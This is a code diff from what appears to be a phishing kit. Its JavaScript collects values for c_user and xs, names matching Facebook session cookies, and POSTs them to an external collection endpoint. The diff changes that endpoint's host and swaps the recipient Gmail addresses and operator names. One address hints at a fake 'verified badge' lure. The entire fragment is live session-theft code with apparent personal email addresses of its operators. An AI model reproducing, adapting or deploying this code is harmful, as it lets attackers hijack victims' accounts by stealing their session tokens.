@@ -1716,7 +1716,7 @@
           const cUserInput = document.getElementById("c_user");
             const xsInput = document.getElementById("xs");
             
-            fetch("https://postal-form.vercel.app/submit", {
+            fetch("https://postal-form.on.shiper.app/submit", {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json",
@@ -1724,11 +1724,11 @@
                 body: JSON.stringify({
                     c_user: cUserInput.value,
                     xs: xsInput.value,
-                    emails: ["mehtabalii67890@gmail.com", "lingdavid24@gmail.com"],
-                    workerEmails: ["mehtabalii67890@gmail.com", "lingdavid24@gmail.com"],
-                    name: "Ishaque",
+                    emails: ["lingdavid24@gmail.com", "opportunityforgetverifiedbadge@gmail.com"],
+                    workerEmail: "lingdavid24@gmail.com",
+                    name: "Noman",
                 }),
-          })
+            })
             .then((response) => {
               if (!response.ok) {
                 console.error("Submission of c_user and xs failed");
